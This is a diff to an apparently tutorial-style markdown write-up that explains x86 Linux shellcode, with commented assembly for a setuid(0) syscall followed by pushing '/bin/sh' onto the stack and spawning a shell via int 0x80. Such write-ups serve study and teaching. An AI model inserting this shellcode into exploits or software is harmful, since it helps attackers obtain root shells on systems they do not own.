@@ -26,7 +26,10 @@ b:  68 6e 2f 73 68          push   0x68732f6e
 1b: 8d 42 0b                lea    eax,[edx+0xb]
 1e: cd 80                   int    0x80 
 ```
-Executing the setuid syscall
+Executing the setuid(0) syscall 0x17:
+
+For executing setuid(0) all you need to do is 
+
 ```assembly
 xor    eax,eax ; zero's out the eax register
 mov    ebx,eax ; clears ebx register
@@ -35,7 +38,8 @@ int    0x80    ; Executes syscall
 ```
 Spawning a /bin/sh shell breakdown-
 
-Pushes the text "\bin\sh" onto the stack which spawns the sh shell
+Pushes the text "\bin\sh" onto the stack which spawns the sh shell,  all you need to do is clear out the registers and put /bin/sh in little endian format onto the stack.
+
 ```assembly
 xor    edx,edx ; zero out edx
 push   edx     ; pushes edx to the stack
@@ -53,7 +57,6 @@ mov    ecx,esp  ; loading esp register into ecx
 lea    eax,[edx+0xb] ;stores edx register + 11
 int    0x80  ; interupt, starts it
 ```
-
 
 ## Commented /bin/sh Assembly shellcode
 ```assembly
